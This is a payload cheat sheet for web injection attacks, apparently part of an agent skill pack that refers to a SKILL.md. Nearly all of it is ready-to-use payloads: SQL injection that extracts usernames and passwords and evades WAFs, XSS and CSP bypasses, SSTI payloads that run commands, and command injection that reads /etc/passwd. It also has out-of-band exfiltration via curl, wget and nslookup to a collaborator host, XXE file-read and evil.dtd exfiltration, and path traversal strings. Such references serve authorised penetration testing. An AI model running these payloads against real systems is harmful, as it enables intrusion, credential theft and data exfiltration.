# Injection Payload Reference

Full payload library for confirmed injection surfaces. Load this once you know the type and context from SKILL.md.

---

## SQL Injection

### UNION Extraction

```sql
-- Find column count
' ORDER BY 1-- / ' ORDER BY 5-- (increment until error)

-- Identify injectable columns
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--

-- Extract version + user
' UNION SELECT @@version,user(),database()--       -- MySQL
' UNION SELECT version(),current_user,current_database()-- -- PostgreSQL

-- Extract tables
' UNION SELECT table_name,table_schema,3 FROM information_schema.tables--

-- Extract columns from a table
' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--

-- Extract data
' UNION SELECT username,password,3 FROM users--
```

### Blind Boolean

```sql
' AND 1=1--   -- same as baseline = injectable
' AND 1=2--   -- different = confirmed
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),{pos},1))>{mid}--
```

### Blind Time-Based

```sql
-- MySQL:    ' AND SLEEP(3)--
-- MySQL:    ' AND IF(ASCII(SUBSTRING((SELECT pw FROM users LIMIT 1),1,1))>64,SLEEP(3),0)--
-- MSSQL:    '; WAITFOR DELAY '0:0:3'--
-- PgSQL:    '; SELECT pg_sleep(3)--
-- Oracle:   ' AND DBMS_PIPE.RECEIVE_MESSAGE('x',3)='x'--
```

### WAF Bypass

```sql
-- Whitespace alternatives
SELECT%09x FROM y   -- tab
SELECT%0ax FROM y   -- newline
SELECT/**/x FROM y  -- comment

-- Case: SeLeCt, sElEcT
-- Keyword splitting: SEL/**/ECT, UN/**/ION
-- URL encode: %53%45%4c%45%43%54
-- Double encode: %2553%2545%254c%2545%2543%2554
-- Function swaps: SLEEP(5) -> BENCHMARK(10000000,SHA1(1))
-- String concat: 'a'||'b' instead of CONCAT('a','b')
```

---

## XSS Payloads

### By Context

```html
<!-- HTML body -->
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<details open ontoggle=alert(document.domain)>

<!-- Attribute -->
" onmouseover=alert(document.domain) x="
' onfocus=alert(document.domain) autofocus='

<!-- JS string -->
';alert(document.domain)//
\';alert(document.domain)//
</script><script>alert(document.domain)</script>

<!-- URL attribute -->
javascript:alert(document.domain)
```

### Filter Bypass

```html
<!-- No parens -->  <img src=x onerror=alert`document.domain`>
<!-- No spaces -->  <svg/onload=alert(1)>
<!-- No quotes -->  <svg onload=alert(document.domain)>
<!-- Entities -->   <img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<!-- Case -->       <ScRiPt>alert(1)</ScRiPt>
<!-- Events -->     onmouseover, onfocus, onblur, ondrag, onwheel, oncopy
```

### CSP Bypass

- JSONP endpoint on CSP-allowed domain
- AngularJS `ng-app` on CDN in allowlist → `ng-click=$event.view.alert(1)`
- `unsafe-inline` or `unsafe-eval` in CSP header
- `base-uri` unrestricted → base tag injection to redirect script src
- Nonce reuse across requests

---

## SSTI Payloads

### Jinja2 (Python)

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
# Find Popen index: {{''.__class__.__mro__[1].__subclasses__()}} then pick subprocess.Popen
{{ ''.__class__.__mro__[1].__subclasses__()[N]('id',shell=True,stdout=-1).communicate()[0] }}
```

### Twig (PHP)

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
```

### Freemarker (Java)

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### ERB (Ruby)

```
<%= system('id') %>
<%= `id` %>
```

---

## Command Injection

### Metacharacters

```bash
; id    | id    & id    `id`    $(id)    || id    && id    %0aid
```

### Filter Bypass

```bash
# Space:    cat${IFS}/etc/passwd   {cat,/etc/passwd}
# Slash:    cat ${HOME:0:1}etc${HOME:0:1}passwd
# Keyword:  c'a't /etc/passwd   c"a"t /etc/passwd
# Wildcard: /etc/p?sswd   /etc/pass*
```

### OOB Exfil

```bash
; curl http://{collab}/{`whoami|base64`}
; nslookup `whoami`.{collab}
; wget "http://{collab}/?d=`cat /etc/passwd|base64 -w0`"
```

---

## XXE

### Classic File Read

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

### Blind OOB Detection

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{collab}/detect"> %xxe;]>
<root>test</root>
```

### Blind OOB Data Exfil

Host `evil.dtd` at your collab server:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{collab}/?d=%file;'>">
%eval; %exfil;
```
Then reference: `<!ENTITY % x SYSTEM "http://{collab}/evil.dtd"> %x;`

### Via SVG Upload

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```

---

## Path Traversal

```
../  ..\  ..%2f  ..%5c  ..%252f  ..%255c  ..%c0%af
....//  ..././  %2e%2e%2f  %2e%2e/
../../../etc/passwd
../../../etc/passwd%00.jpg   (null byte, PHP <5.3)
```
